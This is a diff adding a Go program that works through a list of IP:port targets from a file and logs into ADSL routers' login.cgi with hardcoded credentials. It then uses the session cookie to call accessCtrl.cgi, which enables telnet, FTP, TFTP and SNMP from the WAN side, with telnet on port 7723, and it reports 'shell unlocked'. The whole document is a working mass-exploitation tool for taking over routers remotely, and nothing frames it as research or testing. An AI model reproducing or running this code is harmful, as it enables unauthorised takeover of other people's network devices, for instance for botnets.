@@ -1,0 +1,121 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"crypto/tls"
+	"fmt"
+	"io/ioutil"
+	"net"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+)
+
+func main() {
+	// Read IP:PORT from ips.txt
+	ipsFile, err := os.Open("ips.txt")
+	if err != nil {
+		fmt.Println("Error opening ips.txt:", err)
+		return
+	}
+	defer ipsFile.Close()
+
+	scanner := bufio.NewScanner(ipsFile)
+	for scanner.Scan() {
+		ipPort := scanner.Text()
+
+		url := "http://" + ipPort + "/login.cgi"
+		payload := []byte("username=434990c8a25d2be94863561ae98bd682&password=434990c8a25d2be94863561ae98bd682&sessionKey=0.7707911591569316")
+
+		req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
+		if err != nil {
+			fmt.Println("Error creating request:", err)
+			continue
+		}
+
+		req.Header.Set("Host", ipPort)
+		req.Header.Set("Content-Length", "113")
+		req.Header.Set("Cache-Control", "max-age=0")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Origin", "http://"+ipPort)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Referer", "http://"+ipPort+"/login.html")
+		req.Header.Set("Accept-Encoding", "gzip, deflate")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Connection", "close")
+
+		// Create a custom Transport that sets a timeout and ignores SSL certificate verification
+		tr := &http.Transport{
+			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
+			DialContext:       (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
+			DisableKeepAlives: true,
+		}
+
+		client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
+		resp, err := client.Do(req)
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				fmt.Println("Timed out:", ipPort)
+				continue
+			}
+			fmt.Println("Error sending request:", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+
+				// Check if successful login script is present in the response body
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Println("Error reading response body:", err)
+			continue
+		}
+
+		if strings.Contains(string(body), "<script>location=\"/index.html\"</script>") {
+			fmt.Println("[ADSL] successful login")
+		} else {
+			fmt.Println("[ADSL] login unsuccessful")
+		}
+
+
+		cookieHeader := resp.Header.Get("Set-Cookie")
+		cookieValue := strings.TrimSuffix(strings.TrimPrefix(cookieHeader, "["), "]")
+		cookieValue = strings.Split(cookieValue, ";")[0] // Remove everything after the first semicolon
+		fmt.Println("Set-Cookie:", cookieValue)
+
+		// Sending the GET request with the retrieved Cookie
+		getURL := "http://" + ipPort + "/accessCtrl.cgi?ipaddr=1.1.1.1&httplan=1&httpwan=1&icmplan=1&icmpwan=1&telnetlan=1&telnetwan=1&snmplan=1&snmpwan=1&ftplan=1&ftpwan=1&tftplan=1&tftpwan=1&httpslan=1&httpswan=1&httpport=0&httpsport=0&tftpport=0&telnetport=7723&snmpport=0&sessionKey=1919928186"
+		getReq, err := http.NewRequest("GET", getURL, nil)
+		if err != nil {
+			fmt.Println("Error creating GET request:", err)
+			continue
+		}
+
+		getReq.Header.Set("Host", ipPort)
+		getReq.Header.Set("Upgrade-Insecure-Requests", "1")
+		getReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+		getReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		getReq.Header.Set("Referer", "http://"+ipPort+"/accessCtrl.html")
+		getReq.Header.Set("Accept-Encoding", "gzip, deflate")
+		getReq.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		getReq.Header.Set("Cookie", cookieValue) // Use the retrieved Cookie value here
+		getReq.Header.Set("Connection", "close")
+
+		_, err = client.Do(getReq)
+		if err != nil {
+			fmt.Println("Error sending GET request:", err)
+			continue
+		}
+
+		fmt.Println("[ADSL]: shell unlocked successfully")
+
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Println("Error reading ips.txt:", err)
+	}
+}
